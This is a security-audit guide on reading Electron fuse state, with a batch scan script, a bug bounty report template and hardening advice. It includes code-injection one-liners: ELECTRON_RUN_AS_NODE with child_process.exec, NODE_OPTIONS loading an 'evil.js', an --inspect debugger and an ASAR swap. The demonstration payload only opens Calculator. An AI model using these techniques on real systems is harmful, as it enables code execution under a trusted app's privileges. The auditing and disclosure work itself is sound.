---
title: Auditing Electron Fuses
description: How to read, interpret, and report on Electron fuse state for any installed application
---

# Auditing Electron Fuses

The fuse audit is one of the fastest audits you can run on an Electron app. One command, a few seconds, and you have a complete picture of the binary-level security controls. Most apps fail most of them — not because the developers are careless, but because the fuse tooling is relatively new and nobody went back to retrofit it.

---

## The One-Command Audit

```bash
npx @electron/fuses read --app /path/to/app
```

Everything else in this guide is interpretation of that output.

---

## Finding the App Path

```bash
# macOS:
npx @electron/fuses read --app /Applications/Discord.app
npx @electron/fuses read --app /Applications/Slack.app
npx @electron/fuses read --app /Applications/Signal.app

# Windows:
npx @electron/fuses read --app "C:\Program Files\Discord\Discord.exe"

# Linux:
npx @electron/fuses read --app /opt/discord/discord
npx @electron/fuses read --app /usr/lib/slack/slack
```

---

## What the Output Means

Running this on most shipping Electron apps in 2025 gives you something like:

```
Electron Fuses: v1
RunAsNode is Enabled                            ← problem
EnableCookieEncryption is Disabled              ← problem
EnableNodeOptionsEnvironmentVariable is Enabled ← problem
EnableNodeCliInspectArguments is Enabled        ← problem
EnableEmbeddedAsarIntegrityValidation is Disabled ← problem
OnlyLoadAppFromAsar is Disabled                 ← problem
LoadBrowserProcessSpecificV8Snapshot is Disabled ← OK
GrantFileProtocolExtraPrivileges is Enabled     ← problem
```

Six findings in two seconds. This is normal. The defaults are almost all wrong from a security standpoint.

What each one means:

**RunAsNode Enabled**: `ELECTRON_RUN_AS_NODE=1 /path/to/app -e "require('child_process').exec('cmd')"` — arbitrary Node.js execution using the app's identity and any entitlements it has.

**EnableNodeOptionsEnvironmentVariable Enabled**: `NODE_OPTIONS="--require /tmp/evil.js" /path/to/app` — attacker code loads before any app code.

**EnableNodeCliInspectArguments Enabled**: `/path/to/app --inspect=9229` — main process debugger opened on a port, full REPL access.

**EnableEmbeddedAsarIntegrityValidation Disabled**: The ASAR can be modified and repacked without detection.

**OnlyLoadAppFromAsar Disabled**: Rename `app.asar` to `app.asar.bak`, create an `app/` directory with malicious `main.js`, next launch executes attacker code.

**EnableCookieEncryption Disabled**: Session cookies stored in plaintext SQLite on disk — readable without any privileges.

**GrantFileProtocolExtraPrivileges Enabled**: `file://` pages get elevated trust — useful for path traversal attacks that load local HTML.

---

## Batch Audit Script

```bash
#!/bin/bash
# Scan all Electron apps installed on macOS

APPS=(
  "/Applications/Discord.app"
  "/Applications/Slack.app"
  "/Applications/Notion.app"
  "/Applications/Obsidian.app"
  "/Applications/Signal.app"
  "/Applications/WhatsApp.app"
  "/Applications/1Password 7.app"
  "/Applications/Visual Studio Code.app"
  "/Applications/GitHub Desktop.app"
  "/Applications/Figma.app"
)

for app in "${APPS[@]}"; do
  if [ -d "$app" ]; then
    name=$(basename "$app" .app)
    echo "════════ $name ════════"
    
    result=$(npx --yes @electron/fuses read --app "$app" 2>&1)
    
    echo "$result" | grep -q "RunAsNode is Enabled" && \
      echo "  ⚠️  RunAsNode: ENABLED"
    echo "$result" | grep -q "EnableNodeOptionsEnvironmentVariable is Enabled" && \
      echo "  ⚠️  NODE_OPTIONS: ENABLED"
    echo "$result" | grep -q "EnableNodeCliInspectArguments is Enabled" && \
      echo "  ⚠️  --inspect: ENABLED"
    echo "$result" | grep -q "EnableEmbeddedAsarIntegrityValidation is Disabled" && \
      echo "  ⚠️  ASAR integrity: DISABLED"
    echo "$result" | grep -q "OnlyLoadAppFromAsar is Disabled" && \
      echo "  ⚠️  OnlyLoadAsar: DISABLED"
    echo "$result" | grep -q "EnableCookieEncryption is Disabled" && \
      echo "  ⚠️  Cookie encryption: DISABLED"
    echo "$result" | grep -q "GrantFileProtocolExtraPrivileges is Enabled" && \
      echo "  ⚠️  file:// extra privileges: ENABLED"
    echo ""
  fi
done
```

---

## Demonstrating RunAsNode

This is the one that's easiest to demonstrate with a concrete PoC:

```bash
# Read the fuse state:
npx @electron/fuses read --app /Applications/TargetApp.app

# If RunAsNode is Enabled — demonstrate arbitrary code execution:
ELECTRON_RUN_AS_NODE=1 /Applications/TargetApp.app/Contents/MacOS/TargetApp \
  -e "require('child_process').exec('open -a Calculator')"

# Calculator opens — code execution confirmed under the app's identity
```

---

## Bug Bounty Write-Up Template

```markdown
## Title: [AppName] Electron Fuses Not Hardened — ELECTRON_RUN_AS_NODE Enabled

### Summary
[AppName] Desktop ships with dangerous Electron fuses at their defaults.
`RunAsNode` and `EnableNodeOptionsEnvironmentVariable` are enabled, allowing
an attacker with the ability to set environment variables in the app's launch
context to execute arbitrary Node.js code under [AppName]'s process identity
and privileges.

### Evidence
```bash
$ npx @electron/fuses read --app /Applications/[AppName].app
Electron Fuses: v1
RunAsNode is Enabled
EnableNodeOptionsEnvironmentVariable is Enabled
EnableNodeCliInspectArguments is Enabled
[...]
```

### Proof of Concept
```bash
ELECTRON_RUN_AS_NODE=1 /Applications/[AppName].app/Contents/MacOS/[AppName] \
  -e "require('child_process').exec('open -a Calculator')"
```
Calculator opens. Code executes under [AppName]'s identity.

### Impact
An attacker who can set environment variables in the app's process context
(via shell profile, launchd configuration, installer script execution, or
parent process compromise) can execute arbitrary Node.js code.

### Recommendation
Disable during packaging with `@electron/fuses`:
- `RunAsNode: false`
- `EnableNodeOptionsEnvironmentVariable: false`
- `EnableNodeCliInspectArguments: false`
- `EnableEmbeddedAsarIntegrityValidation: true`
- `OnlyLoadAppFromAsar: true`

### CVSS 3.1
AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H — 8.8 High
```

---

## Severity Guidance

Fuse misconfigs require local access to exploit directly. Programs typically rate them:

| Scenario | Typical payout tier |
|----------|---------------------|
| Fuse finding standalone (local access required) | Medium/P3 |
| Fuse + app runs as admin/SYSTEM | High/P2 — LPE chain |
| Fuse + auto-update can inject env vars | High/P2 |
| Fuse + prior foothold in chain | Depends on chain severity |

RunAsNode and NodeOptions enabled on an app that runs with elevated privileges — say, a security product, backup service, or enterprise agent — is a clean LPE finding. The fuse audit tells you in two seconds whether to look deeper.
